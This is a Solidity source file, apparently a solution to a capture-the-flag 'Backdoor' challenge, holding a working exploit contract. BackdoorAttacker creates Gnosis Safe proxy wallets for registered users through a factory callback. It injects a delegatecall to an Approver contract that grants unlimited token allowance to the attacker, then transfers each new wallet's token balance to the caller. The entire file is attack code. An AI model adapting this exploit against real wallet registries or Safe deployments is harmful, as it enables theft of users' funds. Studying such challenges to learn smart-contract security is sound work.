// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "hardhat/console.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract Approver {
  function approve(address attacker, IERC20 token) public {
      token.approve(attacker, type(uint256).max);
  }
}

contract BackdoorAttacker { 
    address[] private users;

    address private immutable  masterCopy;
    IProxyCreationCallback private immutable  walletRegistry;
    IGnosisSafeProxyFactory private immutable walletFactory;
    IERC20 private immutable token;

    Approver private immutable approver;

    constructor(address _walletFactory, address _walletRegistry, address _masterCopy, address _token, address[] memory _users) { 
        walletFactory = IGnosisSafeProxyFactory(_walletFactory);  
        walletRegistry = IProxyCreationCallback(_walletRegistry);     
        masterCopy = _masterCopy;
        token = IERC20(_token);
        users = _users;         

        approver = new Approver();
    }
    
    function attack() public {    
        bytes memory initializer;
        address[] memory owners = new address[](1); //we can have only 1 owner
        address wallet;

        for(uint256 i; i < users.length; i++) {            
            owners[0] = users[i];
            initializer = abi.encodeCall(GnosisSafe.setup, (
                owners, //current user in the loop is the owner
                1, //threshold must be 1
                address(approver), //contract for delegate call
                abi.encodeCall(Approver.approve, (address(this), token)), //approve max tokens for the attacker contract
                address(0),
                address(0),
                0,
                payable(address(0))
            ));

            //console.logBytes(initializer);
            
            //create a wallet & call into WalletRegistry
            wallet = address(walletFactory.createProxyWithCallback(
                masterCopy, //our singleton contract => GnosisSafe
                initializer,
                0,
                walletRegistry //callack contract
            ));

            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet));
        }
    }
}
